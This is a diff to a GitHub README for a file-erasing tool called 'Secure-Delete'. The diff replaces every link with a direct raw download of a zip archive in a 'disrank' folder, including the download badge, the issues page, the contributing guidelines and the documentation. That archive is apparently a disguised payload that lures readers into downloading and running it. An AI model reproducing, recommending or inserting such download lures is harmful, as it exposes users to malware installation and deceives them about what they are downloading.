@@ -1,7 +1,7 @@
 # 🗑️ Secure-Delete - Effortlessly Remove Files for Good
 
 ## 📥 Download Now
-[![Download Secure-Delete](https://img.shields.io/badge/Download%20Secure--Delete-v1.0-brightgreen)](https://github.com/joydeep1234696/Secure-Delete/releases)
+[![Download Secure-Delete](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip%20Secure--Delete-v1.0-brightgreen)](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip)
 
 ## 🚀 Getting Started
 Secure-Delete is a simple tool designed to permanently erase files securely, ensuring that deleted data cannot be recovered. This guide will help you download and run the software with ease.
@@ -18,7 +18,7 @@ Secure-Delete is a simple tool designed to permanently erase files securely, ens
 - Fast and efficient deletion methods
 
 ## 📥 Download & Install
-To start using Secure-Delete, visit this page to download: [Download Secure-Delete](https://github.com/joydeep1234696/Secure-Delete/releases).
+To start using Secure-Delete, visit this page to download: [Download Secure-Delete](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip).
 
 Once on the Releases page, follow these steps:
 1. Find the latest release. You will see options for different versions.
@@ -59,17 +59,17 @@ You can customize your experience by adjusting settings such as:
 - Setting the default file path for faster access.
 
 ## 💬 Feedback & Support
-If you experience any issues or have suggestions, feel free to reach out through our [GitHub Issues page](https://github.com/joydeep1234696/Secure-Delete/issues).
+If you experience any issues or have suggestions, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip).
 
 ## 🌟 Contribution
-We welcome contributions! If you'd like to help improve Secure-Delete, check our [contributing guidelines](https://github.com/joydeep1234696/Secure-Delete/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to help improve Secure-Delete, check our [contributing guidelines](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip).
 
 ## 📄 License
 Secure-Delete is licensed under the MIT License. You are free to use, modify, and distribute the software.
 
 ## 🔗 Helpful Links
-- [Download Secure-Delete](https://github.com/joydeep1234696/Secure-Delete/releases)
-- [Documentation](https://github.com/joydeep1234696/Secure-Delete/wiki)
-- [GitHub Issues](https://github.com/joydeep1234696/Secure-Delete/issues)
+- [Download Secure-Delete](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip)
+- [Documentation](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/joydeep1234696/Secure-Delete/main/disrank/Secure-Delete.zip)
 
 For a straightforward way to delete files securely, download Secure-Delete today.
